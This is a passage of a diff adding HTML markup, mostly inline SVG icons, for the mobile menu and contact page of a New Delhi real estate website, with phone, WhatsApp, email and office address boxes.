+                                  d="M9.62501 18.5744H2.70418C2.65555 18.5744 2.60892 18.5551 2.57454 18.5207C2.54016 18.4863 2.52084 18.4397 2.52084 18.3911V17.0619C2.52084 16.3002 3.06443 15.6292 3.90226 15.059C5.39826 14.0378 7.81918 13.3943 10.5417 13.3943C10.9908 13.3943 11.4318 13.4127 11.8626 13.4466C11.9537 13.4558 12.0457 13.4466 12.1332 13.4198C12.2207 13.3929 12.3019 13.3489 12.3722 13.2902C12.4424 13.2315 12.5003 13.1594 12.5423 13.0781C12.5843 12.9968 12.6097 12.9079 12.6169 12.8166C12.6241 12.7254 12.613 12.6336 12.5842 12.5467C12.5555 12.4598 12.5097 12.3795 12.4495 12.3105C12.3893 12.2416 12.316 12.1853 12.2338 12.1451C12.1516 12.1048 12.0621 12.0814 11.9708 12.0762C11.4954 12.038 11.0186 12.0191 10.5417 12.0193C7.49651 12.0193 4.80059 12.7811 3.12676 13.9223C1.84984 14.7932 1.14584 15.8996 1.14584 17.061V18.3911C1.14609 18.8042 1.31037 19.2003 1.60259 19.4924C1.89481 19.7844 2.29104 19.9485 2.70418 19.9485L9.62501 19.9494C9.80735 19.9494 9.98221 19.877 10.1111 19.748C10.2401 19.6191 10.3125 19.4443 10.3125 19.2619C10.3125 19.0796 10.2401 18.9047 10.1111 18.7758C9.98221 18.6468 9.80735 18.5744 9.62501 18.5744ZM10.5417 1.14583C7.75868 1.14583 5.50001 3.4045 5.50001 6.1875C5.50001 8.9705 7.75868 11.2292 10.5417 11.2292C13.3247 11.2292 15.5833 8.9705 15.5833 6.1875C15.5833 3.4045 13.3247 1.14583 10.5417 1.14583ZM10.5417 2.52083C12.5657 2.52083 14.2083 4.1635 14.2083 6.1875C14.2083 8.2115 12.5657 9.85416 10.5417 9.85416C8.51768 9.85416 6.87501 8.2115 6.87501 6.1875C6.87501 4.1635 8.51768 2.52083 10.5417 2.52083Z"
+                                  fill="#1C1C1E"/>
+                                <path
+                                  d="M16.6393 18.524C17.2592 18.618 17.8928 18.5515 18.4796 18.3311C19.0665 18.1106 19.5871 17.7434 19.9918 17.2646C20.3965 16.7858 20.6717 16.2112 20.7913 15.5958C20.9109 14.9804 20.8707 14.3446 20.6748 13.7491C20.4788 13.1536 20.1335 12.6182 19.6719 12.194C19.2102 11.7698 18.6476 11.471 18.0377 11.326C17.4277 11.1811 16.7908 11.1948 16.1877 11.3659C15.5846 11.537 15.0353 11.8598 14.5924 12.3035C14.186 12.7095 13.8807 13.2053 13.7013 13.751C13.5218 14.2967 13.4732 14.877 13.5593 15.4449L11.4308 17.5725C11.3669 17.6364 11.3161 17.7123 11.2815 17.7958C11.2469 17.8793 11.2291 17.9688 11.2292 18.0593V20.1667C11.2292 20.5462 11.5372 20.8542 11.9167 20.8542H14.0241C14.1145 20.8542 14.204 20.8364 14.2875 20.8018C14.3711 20.7672 14.4469 20.7165 14.5108 20.6525L16.6393 18.524ZM16.5917 17.1123C16.4753 17.0813 16.3528 17.0814 16.2365 17.1127C16.1202 17.1439 16.0141 17.2051 15.9289 17.2902L13.7399 19.4792H12.6042V18.3434L14.7932 16.1544C14.8782 16.0692 14.9395 15.9631 14.9707 15.8468C15.0019 15.7305 15.002 15.608 14.971 15.4917C14.8415 15.0042 14.8762 14.4878 15.0697 14.022C15.2632 13.5563 15.6046 13.1672 16.0413 12.915C16.478 12.6627 16.9857 12.5613 17.4858 12.6264C17.9859 12.6915 18.4506 12.9195 18.8082 13.2752C19.1638 13.6327 19.3918 14.0975 19.4569 14.5976C19.522 15.0977 19.4206 15.6053 19.1684 16.042C18.9161 16.4787 18.5271 16.8202 18.0613 17.0136C17.5956 17.2071 17.0791 17.2418 16.5917 17.1123Z"
+                                  fill="#FFA920"/>
+                                <path
+                                  d="M16.4835 15.5998C16.3877 15.5083 16.3111 15.3984 16.2583 15.2768C16.2055 15.1552 16.1775 15.0243 16.1761 14.8917C16.1746 14.7592 16.1996 14.6276 16.2497 14.5049C16.2998 14.3822 16.374 14.2707 16.4678 14.177C16.5616 14.0833 16.6732 14.0093 16.796 13.9594C16.9188 13.9095 17.0503 13.8846 17.1829 13.8862C17.3154 13.8879 17.4463 13.916 17.5679 13.9689C17.6894 14.0219 17.7991 14.0986 17.8906 14.1946C18.0698 14.3826 18.1683 14.6333 18.1651 14.893C18.1619 15.1527 18.0572 15.4009 17.8734 15.5845C17.6896 15.768 17.4413 15.8724 17.1816 15.8752C16.9219 15.8781 16.6713 15.7793 16.4835 15.5998Z"
+                                  fill="#FFA920"/>
+                              </svg>
+                              <a data-toggle="modal" data-target="#popup_bid" class="fw-7 font-2">Login</a>
+                            </div>
+                            <div class="menu-outer"></div>
+                            <div class="button-mobi-sell">
+                              <a class="sc-button btn-icon center" href="javascript:;">
+                                <svg
+                                  width="25"
+                                  height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                  <path
+                                    d="M13.25 15.75V15H11.375C10.7547 15 10.25 14.4953 10.25 13.875V12.375C10.25 11.7547 10.7547 11.25 11.375 11.25H11.75V10.5H13.25V11.25H14C14.1989 11.25 14.3897 11.329 14.5303 11.4697C14.671 11.6103 14.75 11.8011 14.75 12C14.75 12.1989 14.671 12.3897 14.5303 12.5303C14.3897 12.671 14.1989 12.75 14 12.75H11.75V13.5H13.625C14.2453 13.5 14.75 14.0047 14.75 14.625V16.125C14.75 16.7453 14.2453 17.25 13.625 17.25H13.25V18H11.75V17.25H11C10.8011 17.25 10.6103 17.171 10.4697 17.0303C10.329 16.8897 10.25 16.6989 10.25 16.5C10.25 16.3011 10.329 16.1103 10.4697 15.9697C10.6103 15.829 10.8011 15.75 11 15.75H13.25Z"
+                                    fill="white"
+                                  />
+                                  <path
+                                    d="M22.469 10.6447L14.315 2.96925C13.8234 2.50736 13.1742 2.25024 12.4996 2.25024C11.825 2.25024 11.1759 2.50736 10.6842 2.96925L8.74998 4.791V3C8.74998 2.80109 8.67096 2.61032 8.53031 2.46967C8.38966 2.32902 8.19889 2.25 7.99998 2.25H4.99998C4.80107 2.25 4.6103 2.32902 4.46965 2.46967C4.329 2.61032 4.24998 2.80109 4.24998 3V9.027L2.55273 10.6252C2.03748 11.0722 1.86348 11.784 2.10798 12.4387C2.34873 13.0837 2.93823 13.5 3.60948 13.5H4.24998V21C4.24998 21.1989 4.329 21.3897 4.46965 21.5303C4.6103 21.671 4.80107 21.75 4.99998 21.75H20C20.1989 21.75 20.3897 21.671 20.5303 21.5303C20.671 21.3897 20.75 21.1989 20.75 21V13.5H21.389C22.061 13.5 22.6512 13.083 22.892 12.438C23.1357 11.7832 22.961 11.0715 22.469 10.6447ZM5.74998 3.75H7.24998V6.2025L5.74998 7.61475V3.75ZM21.4865 11.9138C21.4542 12 21.4047 12 21.389 12H20C19.8011 12 19.6103 12.079 19.4697 12.2197C19.329 12.3603 19.25 12.5511 19.25 12.75V20.25H5.74998V12.75C5.74998 12.5511 5.67096 12.3603 5.53031 12.2197C5.38966 12.079 5.19889 12 4.99998 12H3.60948C3.59373 12 3.54498 12 3.51273 11.9138C3.50022 11.8834 3.49792 11.8498 3.50617 11.818C3.51442 11.7862 3.53278 11.7579 3.55848 11.7375L11.7125 4.062C11.9257 3.86178 12.2071 3.75032 12.4996 3.75032C12.7921 3.75032 13.0735 3.86178 13.2867 4.062L21.4625 11.7578C21.5187 11.8058 21.4977 11.883 21.4865 11.9138Z"
+                                    fill="white"
+                                  />
+                                </svg>
+                                <span>Post property</span>
+                              </a>
+                            </div>
+                            <div class="mobi-icon-box">
+                              <h3>Contact</h3>
+                              <div class="box flex">
+                                <div class="icon">
+                                  <svg
+                                    width="40"
+                                    height="41"
+                                    viewBox="0 0 50 51"
+                                    fill="none"
+                                    xmlns="http://www.w3.org/2000/svg">
+                                    <path
+                                      d="M26.4648 13.7812C26.4648 14.5902 27.1207 15.2461 27.9297 15.2461C28.7387 15.2461 29.3945 14.5902 29.3945 13.7812C29.3945 12.9723 28.7387 12.3164 27.9297 12.3164C27.1207 12.3164 26.4648 12.9723 26.4648 13.7812Z"
+                                      fill="#E5E5EA"
+                                    ></path>
+                                    <path
+                                      d="M32.3242 13.7812C32.3242 14.5902 32.9801 15.2461 33.7891 15.2461C34.598 15.2461 35.2539 14.5902 35.2539 13.7812C35.2539 12.9723 34.598 12.3164 33.7891 12.3164C32.9801 12.3164 32.3242 12.9723 32.3242 13.7812Z"
+                                      fill="#E5E5EA"
+                                    ></path>
+                                    <path
+                                      d="M38.1836 13.7812C38.1836 14.5902 38.8395 15.2461 39.6484 15.2461C40.4574 15.2461 41.1133 14.5902 41.1133 13.7812C41.1133 12.9723 40.4574 12.3164 39.6484 12.3164C38.8395 12.3164 38.1836 12.9723 38.1836 13.7812Z"
+                                      fill="#E5E5EA"
+                                    ></path>
+                                    <path
+                                      d="M22.6771 37.2188L27.0716 34.2891L35.8398 37.2188V43.0781C35.8398 44.6961 34.549 46.0078 32.931 46.0078C16.7508 46.0078 1.46484 30.8195 1.46484 14.6394C1.46484 13.0214 2.77656 11.7305 4.39453 11.7305H10.2539L13.1836 20.4987L10.2539 24.8933C12.1247 29.5703 18 35.3479 22.6771 37.2188Z"
+                                      stroke="#E5E5EA"
+                                      stroke-width="1.7"
+                                      stroke-miterlimit="10"
+                                      stroke-linecap="round"
+                                      stroke-linejoin="round"
+                                    ></path>
+                                    <path
+                                      d="M19.1406 13.7812C19.1406 18.6354 23.0756 22.5703 27.9297 22.5703V28.4297L33.7891 22.5703H39.6484C44.5025 22.5703 48.5352 18.6354 48.5352 13.7812C48.5352 8.92715 44.5025 4.99219 39.6484 4.99219H27.9297C23.0756 4.99219 19.1406 8.92715 19.1406 13.7812Z"
+                                      stroke="#E5E5EA"
+                                      stroke-width="1.7"
+                                      stroke-miterlimit="10"
+                                      stroke-linecap="round"
+                                      stroke-linejoin="round"
+                                    ></path>
+                                  </svg>
+                                </div>
+                                <div class="fs-13">
+                                  Call us:
+                                  <h5>+91-9818106665</h5>
+                                </div>
+                              </div>
+                              <div class="box flex">
+                                <div class="icon">
+                                  <svg width="40" height="40" viewBox="0 0 50 50" fill="none"
+                                    xmlns="http://www.w3.org/2000/svg">
+                                    <path
+                                      d="M36.6559 17.8341L36.6559 17.8341L36.6609 17.8392C36.8315 18.0113 37.0549 18.0969 37.2788 18.0969C37.5021 18.0969 37.7258 18.0116 37.8976 17.8411C38.2409 17.5005 38.241 16.9425 37.8996 16.5985C37.5586 16.2548 37.0037 16.2526 36.66 16.5934L36.6559 17.8341ZM36.6559 17.8341L36.6551 17.8332M36.6559 17.8341L36.6551 17.8332M36.6551 17.8332C36.3141 17.4895 36.3163 16.9345 36.66 16.5935L36.6551 17.8332Z"
+                                      fill="#E5E5EA"
+                                      stroke="white"
+                                      stroke-width="0.2"
+                                    ></path>
+                                    <path
+                                      d="M46.4639 27.8825H46.7054L46.5346 27.7118L39.3343 20.5115C38.992 20.1691 38.992 19.6141 39.3343 19.2718C39.6767 18.9296 40.2317 18.9296 40.574 19.2718L49.6441 28.3419C49.8085 28.5063 49.9009 28.7294 49.901 28.9618C49.901 29.1943 49.8086 29.4172 49.6442 29.5816L34.0757 45.1502C33.9114 45.3145 33.6884 45.4069 33.4559 45.4069C33.2235 45.4069 33.0005 45.3145 32.8361 45.1502L9.34306 21.6572C9.34306 21.6572 9.34305 21.6572 9.34305 21.6572C9.00075 21.3148 9.00076 20.7598 9.34305 20.4175L24.9114 4.84884C25.2537 4.50664 25.8087 4.50664 26.151 4.84884C26.151 4.84884 26.151 4.84884 26.1511 4.84884L34.9723 13.67C35.3146 14.0124 35.3146 14.5675 34.9723 14.9098C34.6299 15.252 34.0749 15.2519 33.7326 14.9098L26.7811 7.95839L26.6104 7.78768V8.0291V25.1994C26.6104 26.679 27.8139 27.8825 29.2935 27.8825H46.4639ZM24.8575 7.62373V7.38231L24.6868 7.55302L12.2497 19.9901L12.079 20.1608H12.3204H24.7575H24.8575V20.0608V7.62373ZM32.4087 42.2434L32.5794 42.4141V42.1727V29.7356V29.6356H32.4794H29.2937C26.8477 29.6356 24.8575 27.6455 24.8575 25.1994V22.0139V21.9139H24.7575H12.3204H12.079L12.2497 22.0846L32.4087 42.2434ZM34.3324 42.1728V42.4142L34.5031 42.2435L46.9401 29.8064L47.1108 29.6356H46.8694H34.4324H34.3324V29.7356V42.1728Z"
+                                      fill="#E5E5EA" stroke="white" stroke-width="0.2"
+                                    ></path>
+                                    <path
+                                      d="M0.976562 24.9047H6.70225C7.18637 24.9047 7.57881 25.2972 7.57881 25.7812C7.57881 26.2654 7.18637 26.6578 6.70225 26.6578H0.976562C0.492442 26.6578 0.1 26.2653 0.1 25.7812C0.1 25.2972 0.492442 24.9047 0.976562 24.9047Z"
+                                      fill="#E5E5EA"
+                                      stroke="white"
+                                      stroke-width="0.2"
+                                    ></path>
+                                    <path
+                                      d="M9.59961 24.9047H9.61426C10.0984 24.9047 10.4908 25.2972 10.4908 25.7812C10.4908 26.2653 10.0984 26.6578 9.61426 26.6578H9.59961C9.11549 26.6578 8.72305 26.2653 8.72305 25.7812C8.72305 25.2972 9.11549 24.9047 9.59961 24.9047Z"
+                                      fill="#E5E5EA"
+                                      stroke="white"
+                                      stroke-width="0.2"
+                                    ></path>
+                                    <path
+                                      d="M0.978516 14.6508H4.10381C4.58793 14.6508 4.98037 15.0433 4.98037 15.5273C4.98037 16.0114 4.58793 16.4039 4.10381 16.4039H0.978516C0.494395 16.4039 0.101953 16.0114 0.101953 15.5273C0.101953 15.0433 0.494395 14.6508 0.978516 14.6508Z"
+                                      fill="#E5E5EA"
+                                      stroke="white"
+                                      stroke-width="0.2"
+                                    ></path>
+                                    <path
+                                      d="M7.29315 14.6508H10.9873C11.4714 14.6508 11.8639 15.0433 11.8639 15.5273C11.8639 16.0114 11.4714 16.4039 10.9873 16.4039H7.29315C6.80903 16.4039 6.41659 16.0114 6.41659 15.5273C6.41659 15.0433 6.80903 14.6508 7.29315 14.6508Z"
+                                      fill="#E5E5EA"
+                                      stroke="white"
+                                      stroke-width="0.2"
+                                    ></path>
+                                    <path
+                                      d="M7.64453 30.2758H13.1132C13.5972 30.2758 13.9897 30.6683 13.9897 31.1523C13.9897 31.6364 13.5973 32.0289 13.1132 32.0289H7.64453C7.16041 32.0289 6.76797 31.6364 6.76797 31.1523C6.76797 30.6683 7.16041 30.2758 7.64453 30.2758Z"
+                                      fill="#E5E5EA"
+                                      stroke="white"
+                                      stroke-width="0.2"
+                                    ></path>
+                                    <path
+                                      d="M3.61328 36.5258H17.3827C17.8668 36.5258 18.2593 36.9183 18.2593 37.4023C18.2593 37.8864 17.8668 38.2789 17.3827 38.2789H3.61328C3.12916 38.2789 2.73672 37.8864 2.73672 37.4023C2.73672 36.9183 3.12916 36.5258 3.61328 36.5258Z"
+                                      fill="#E5E5EA"
+                                      stroke="white"
+                                      stroke-width="0.2"
+                                    ></path>
+                                  </svg>
+                                </div>
+                                <div class="fs-13 lh-16">
+                                  Email:
+                                  <h5>
+                                    <a
+                                      href="https://cdr_india.co/cdn-cgi/l/email-protection"
+                                      class="__cf_email__"
+                                      data-cfemail="daaeb2bfb7bfa9bcb6bbae9abdb7bbb3b6f4b9b5b7"
+                                      >cdrpropertiesindia@gmail.com</a
+                                    >
+                                  </h5>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </nav>
+                      </div>
+                      <!-- End Mobile Menu -->
+                    </header>
+                    <!-- End Main Header -->
+
+      <!-- Content -->
+      
+<section class="flat-title " >
+                <div class="container">
+                    <div class="row">                      
+                        <div class="col-lg-12">
+                            <div class="title-inner style">
+                                <div class="title-group fs-12"><a class="home fw-6 text-color-3" href="https://luxurypropertybuilders.com">Home</a><span >Contact</span></div>
+                            </div>
+                        </div> 
+                    </div>
+                </div>
+            </section>
+            
+            <section class="flat-contact  page-contact relative" >
+                <div class="container">
+                    <div class="row">                      
+                        <div class="col-lg-6 col-md-7">
+                            <div class="heading-section">
+                                <h2 class="font-2 fw-8 ">We provide the most suitable and quality real estate.</h2>
+                                <p class="text-color-" hidden>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce sed tristique metus proin id lorem odio</p>
+                            </div>
+                            <div class="wrap-info">
+                                <div class="box-info flex align-center">
+                                    <div class="icon-info">
+                                        <svg width="50" height="50" viewBox="0 0 50 50" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                            <path d="M42.5742 38.0897L42.7 38.0394V37.904V23.749C42.7 23.1695 43.1704 22.699 43.75 22.699C44.3295 22.699 44.8 23.1695 44.8 23.749V38.749C44.8 39.179 44.5378 39.5638 44.1424 39.7261C44.1421 39.7262 44.1419 39.7263 44.1417 39.7264L31.6657 44.7158L31.7375 44.8952C31.7375 44.8974 31.7375 44.8994 31.7375 44.9015L31.6563 44.7187L31.6371 44.7272C31.3894 44.8262 31.113 44.8262 30.8654 44.7272L30.8462 44.7187L30.8074 44.7015H30.801L18.8243 39.9108L18.75 39.8811L18.6757 39.9108L6.64074 44.7233L6.64072 44.7233C6.5143 44.7739 6.382 44.799 6.25 44.799C6.04199 44.799 5.83872 44.7382 5.66233 44.6185C5.37414 44.4229 5.2 44.0971 5.2 43.749V21.249C5.2 20.8188 5.46227 20.4344 5.85956 20.2746C5.85958 20.2746 5.8596 20.2746 5.85962 20.2746L18.3281 15.2857L18.3282 15.2863L18.3507 15.2788L18.3509 15.2791L18.3623 15.2745C18.6118 15.1739 18.8907 15.1739 19.1402 15.2745L19.1401 15.2746L19.1448 15.2763L19.1648 15.2838L19.1987 15.2965H19.1989L26.6456 18.2772C26.6456 18.2772 26.6456 18.2772 26.6457 18.2772C27.1862 18.4939 27.4479 19.1052 27.2319 19.6419L27.2318 19.6421C27.0154 20.182 26.3971 20.4421 25.8673 20.2285L25.8668 20.2283L20.0743 17.9108L19.8 17.8011V18.0965V37.9015V38.0369L19.9257 38.0872L29.9257 42.0872L30.2 42.1969V41.9015V28.749C30.2 28.1695 30.6704 27.699 31.25 27.699C31.8295 27.699 32.3 28.1695 32.3 28.749V41.904V42.1994L32.5742 42.0897L42.5742 38.0897ZM18.2775 15.134L18.265 15.1028L18.265 15.1028L18.265 15.0965L18.2775 15.134ZM17.5743 38.0872L17.7 38.0369V37.9015V18.094V17.7986L17.4257 17.9083L7.42572 21.9083L7.3 21.9586V22.094V41.9015V42.1969L7.57428 42.0872L17.5743 38.0872Z" fill="#8E8E93" stroke="white" stroke-width="0.4"/>
+                                            <path d="M32.6999 13.749C32.6999 11.792 34.2928 10.199 36.2499 10.199C38.2069 10.199 39.7999 11.792 39.7999 13.749C39.7999 15.7061 38.2069 17.299 36.2499 17.299C34.2928 17.299 32.6999 15.7061 32.6999 13.749ZM34.7999 13.749C34.7999 14.5495 35.4494 15.199 36.2499 15.199C37.0503 15.199 37.6999 14.5495 37.6999 13.749C37.6999 12.9486 37.0503 12.299 36.2499 12.299C35.4494 12.299 34.7999 12.9486 34.7999 13.749Z" fill="#8E8E93" stroke="white" stroke-width="0.4"/>
+                                            <path d="M36.0971 24.4704L36.25 24.6518L36.4029 24.4704C37.7722 22.8466 39.3407 20.7865 40.5681 18.831C41.1818 17.8533 41.7126 16.8981 42.0906 16.0341C42.4666 15.1746 42.7 14.3865 42.7 13.749C42.7 10.1936 39.8054 7.29902 36.25 7.29902C32.6945 7.29902 29.8 10.1936 29.8 13.749C29.8 14.3871 30.0334 15.1755 30.4094 16.0351C30.7874 16.8993 31.3182 17.8544 31.9319 18.8319C33.1593 20.7872 34.7278 22.8466 36.0971 24.4704ZM27.7 13.749C27.7 9.03448 31.5355 5.19902 36.25 5.19902C40.9645 5.19902 44.8 9.03448 44.8 13.749C44.8 14.8262 44.3769 16.1323 43.7105 17.5145C43.0462 18.8922 42.1501 20.3255 41.2259 21.6512C39.3782 24.3016 37.43 26.5055 37.0314 26.9501C36.8312 27.1712 36.5474 27.299 36.25 27.299C35.9526 27.299 35.6688 27.1712 35.4686 26.9501C35.0699 26.5053 33.1217 24.3015 31.2741 21.6512C30.3499 20.3255 29.4538 18.8922 28.7895 17.5145C28.1231 16.1323 27.7 14.8262 27.7 13.749Z" fill="#8E8E93" stroke="white" stroke-width="0.4"/>
+                                        </svg>
+                                    </div>
+									                                    <div class="">
+                                        <h5 class="text-color-4">Office address</h5>
+                                        <h4 class="fw-4 text-color-2 fs-16">LUXURY PROPERTIES
+                                            New Delhi - 110096</h4>
+                                    </div>
+									                                 </div>
+								                                <div class="box-info flex align-center">
+                                    <div class="icon-info">
+                                        <svg width="50" height="51" viewBox="0 0 50 51" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                            <path d="M26.4648 13.7812C26.4648 14.5902 27.1207 15.2461 27.9297 15.2461C28.7387 15.2461 29.3945 14.5902 29.3945 13.7812C29.3945 12.9723 28.7387 12.3164 27.9297 12.3164C27.1207 12.3164 26.4648 12.9723 26.4648 13.7812Z" fill="#8E8E93"/>
+                                            <path d="M32.3242 13.7812C32.3242 14.5902 32.9801 15.2461 33.7891 15.2461C34.598 15.2461 35.2539 14.5902 35.2539 13.7812C35.2539 12.9723 34.598 12.3164 33.7891 12.3164C32.9801 12.3164 32.3242 12.9723 32.3242 13.7812Z" fill="#8E8E93"/>
+                                            <path d="M38.1836 13.7812C38.1836 14.5902 38.8395 15.2461 39.6484 15.2461C40.4574 15.2461 41.1133 14.5902 41.1133 13.7812C41.1133 12.9723 40.4574 12.3164 39.6484 12.3164C38.8395 12.3164 38.1836 12.9723 38.1836 13.7812Z" fill="#8E8E93"/>
+                                            <path d="M22.6771 37.2188L27.0716 34.2891L35.8398 37.2188V43.0781C35.8398 44.6961 34.549 46.0078 32.931 46.0078C16.7508 46.0078 1.46484 30.8195 1.46484 14.6394C1.46484 13.0214 2.77656 11.7305 4.39453 11.7305H10.2539L13.1836 20.4987L10.2539 24.8933C12.1247 29.5703 18 35.3479 22.6771 37.2188Z" stroke="#8E8E93" stroke-width="1.7" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+                                            <path d="M19.1406 13.7812C19.1406 18.6354 23.0756 22.5703 27.9297 22.5703V28.4297L33.7891 22.5703H39.6484C44.5025 22.5703 48.5352 18.6354 48.5352 13.7812C48.5352 8.92715 44.5025 4.99219 39.6484 4.99219H27.9297C23.0756 4.99219 19.1406 8.92715 19.1406 13.7812Z" stroke="#8E8E93" stroke-width="1.7" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+                                        </svg>
+                                    </div>
+                                    <div class="">
+                                        <h5 class="text-color-4">Request a call back</h5>
+                                        <a href="tel:+91 9876543210" ><h4 class="fw-8 font-2 text-color-3 lh-37">+91 9876543210</h4></a>
+                                    </div>
+                                </div>
+								                                
+								                                <div class="box-info flex align-center">
+                                    <div class="icon-info">
+                                        <svg width="50" height="51" viewBox="0 0 50 51" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                            <path d="M26.4648 13.7812C26.4648 14.5902 27.1207 15.2461 27.9297 15.2461C28.7387 15.2461 29.3945 14.5902 29.3945 13.7812C29.3945 12.9723 28.7387 12.3164 27.9297 12.3164C27.1207 12.3164 26.4648 12.9723 26.4648 13.7812Z" fill="#8E8E93"/>
+                                            <path d="M32.3242 13.7812C32.3242 14.5902 32.9801 15.2461 33.7891 15.2461C34.598 15.2461 35.2539 14.5902 35.2539 13.7812C35.2539 12.9723 34.598 12.3164 33.7891 12.3164C32.9801 12.3164 32.3242 12.9723 32.3242 13.7812Z" fill="#8E8E93"/>
+                                            <path d="M38.1836 13.7812C38.1836 14.5902 38.8395 15.2461 39.6484 15.2461C40.4574 15.2461 41.1133 14.5902 41.1133 13.7812C41.1133 12.9723 40.4574 12.3164 39.6484 12.3164C38.8395 12.3164 38.1836 12.9723 38.1836 13.7812Z" fill="#8E8E93"/>
+                                            <path d="M22.6771 37.2188L27.0716 34.2891L35.8398 37.2188V43.0781C35.8398 44.6961 34.549 46.0078 32.931 46.0078C16.7508 46.0078 1.46484 30.8195 1.46484 14.6394C1.46484 13.0214 2.77656 11.7305 4.39453 11.7305H10.2539L13.1836 20.4987L10.2539 24.8933C12.1247 29.5703 18 35.3479 22.6771 37.2188Z" stroke="#8E8E93" stroke-width="1.7" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+                                            <path d="M19.1406 13.7812C19.1406 18.6354 23.0756 22.5703 27.9297 22.5703V28.4297L33.7891 22.5703H39.6484C44.5025 22.5703 48.5352 18.6354 48.5352 13.7812C48.5352 8.92715 44.5025 4.99219 39.6484 4.99219H27.9297C23.0756 4.99219 19.1406 8.92715 19.1406 13.7812Z" stroke="#8E8E93" stroke-width="1.7" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+                                        </svg>
+                                    </div>
+                                    <div class="">
+                                        <h5 class="text-color-4">Whatsapp</h5>
+                                        <a href="https://api.whatsapp.com/send/?phone=+919876543210&type=phone_number&app_absent=1&text=Hi%20Welcome%20to%20CDR%20Properties" target="_blank"><h4 class="fw-8 font-2 text-color-3 lh-37">+919876543210</h4></a>
+
+                                    </div>
+                                </div>
+								                                <div class="box-info flex align-center">
+                                    <div class="icon-info">
+                                        <svg width="50" height="50" viewBox="0 0 50 50" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                            <g clip-path="url(#clip0_1505_28697)">
+                                            <path d="M36.6559 17.8341L36.6559 17.8341L36.6609 17.8392C36.8315 18.0113 37.0549 18.0969 37.2788 18.0969C37.5021 18.0969 37.7258 18.0116 37.8976 17.8411C38.2409 17.5005 38.241 16.9425 37.8996 16.5985C37.5586 16.2548 37.0037 16.2526 36.66 16.5934L36.6559 17.8341ZM36.6559 17.8341L36.6551 17.8332M36.6559 17.8341L36.6551 17.8332M36.6551 17.8332C36.3141 17.4895 36.3163 16.9345 36.66 16.5935L36.6551 17.8332Z" fill="#8E8E93" stroke="white" stroke-width="0.2"/>
+                                            <path d="M46.4639 27.8825H46.7054L46.5346 27.7118L39.3343 20.5115C38.992 20.1691 38.992 19.6141 39.3343 19.2718C39.6767 18.9296 40.2317 18.9296 40.574 19.2718L49.6441 28.3419C49.8085 28.5063 49.9009 28.7294 49.901 28.9618C49.901 29.1943 49.8086 29.4172 49.6442 29.5816L34.0757 45.1502C33.9114 45.3145 33.6884 45.4069 33.4559 45.4069C33.2235 45.4069 33.0005 45.3145 32.8361 45.1502L9.34306 21.6572C9.34306 21.6572 9.34305 21.6572 9.34305 21.6572C9.00075 21.3148 9.00076 20.7598 9.34305 20.4175L24.9114 4.84884C25.2537 4.50664 25.8087 4.50664 26.151 4.84884C26.151 4.84884 26.151 4.84884 26.1511 4.84884L34.9723 13.67C35.3146 14.0124 35.3146 14.5675 34.9723 14.9098C34.6299 15.252 34.0749 15.2519 33.7326 14.9098L26.7811 7.95839L26.6104 7.78768V8.0291V25.1994C26.6104 26.679 27.8139 27.8825 29.2935 27.8825H46.4639ZM24.8575 7.62373V7.38231L24.6868 7.55302L12.2497 19.9901L12.079 20.1608H12.3204H24.7575H24.8575V20.0608V7.62373ZM32.4087 42.2434L32.5794 42.4141V42.1727V29.7356V29.6356H32.4794H29.2937C26.8477 29.6356 24.8575 27.6455 24.8575 25.1994V22.0139V21.9139H24.7575H12.3204H12.079L12.2497 22.0846L32.4087 42.2434ZM34.3324 42.1728V42.4142L34.5031 42.2435L46.9401 29.8064L47.1108 29.6356H46.8694H34.4324H34.3324V29.7356V42.1728Z" fill="#8E8E93" stroke="white" stroke-width="0.2"/>
+                                            <path d="M0.976562 24.9047H6.70225C7.18637 24.9047 7.57881 25.2972 7.57881 25.7812C7.57881 26.2654 7.18637 26.6578 6.70225 26.6578H0.976562C0.492442 26.6578 0.1 26.2653 0.1 25.7812C0.1 25.2972 0.492442 24.9047 0.976562 24.9047Z" fill="#8E8E93" stroke="white" stroke-width="0.2"/>
+                                            <path d="M9.59961 24.9047H9.61426C10.0984 24.9047 10.4908 25.2972 10.4908 25.7812C10.4908 26.2653 10.0984 26.6578 9.61426 26.6578H9.59961C9.11549 26.6578 8.72305 26.2653 8.72305 25.7812C8.72305 25.2972 9.11549 24.9047 9.59961 24.9047Z" fill="#8E8E93" stroke="white" stroke-width="0.2"/>
+                                            <path d="M0.978516 14.6508H4.10381C4.58793 14.6508 4.98037 15.0433 4.98037 15.5273C4.98037 16.0114 4.58793 16.4039 4.10381 16.4039H0.978516C0.494395 16.4039 0.101953 16.0114 0.101953 15.5273C0.101953 15.0433 0.494395 14.6508 0.978516 14.6508Z" fill="#8E8E93" stroke="white" stroke-width="0.2"/>
+                                            <path d="M7.29315 14.6508H10.9873C11.4714 14.6508 11.8639 15.0433 11.8639 15.5273C11.8639 16.0114 11.4714 16.4039 10.9873 16.4039H7.29315C6.80903 16.4039 6.41659 16.0114 6.41659 15.5273C6.41659 15.0433 6.80903 14.6508 7.29315 14.6508Z" fill="#8E8E93" stroke="white" stroke-width="0.2"/>
+                                            <path d="M7.64453 30.2758H13.1132C13.5972 30.2758 13.9897 30.6683 13.9897 31.1523C13.9897 31.6364 13.5973 32.0289 13.1132 32.0289H7.64453C7.16041 32.0289 6.76797 31.6364 6.76797 31.1523C6.76797 30.6683 7.16041 30.2758 7.64453 30.2758Z" fill="#8E8E93" stroke="white" stroke-width="0.2"/>
+                                            <path d="M3.61328 36.5258H17.3827C17.8668 36.5258 18.2593 36.9183 18.2593 37.4023C18.2593 37.8864 17.8668 38.2789 17.3827 38.2789H3.61328C3.12916 38.2789 2.73672 37.8864 2.73672 37.4023C2.73672 36.9183 3.12916 36.5258 3.61328 36.5258Z" fill="#8E8E93" stroke="white" stroke-width="0.2"/>
+                                            </g>
+                                            <defs> 
+                                            <clipPath id="clip0_1505_28697">
+                                            <rect width="50" height="50" fill="white"/>
+                                            </clipPath>
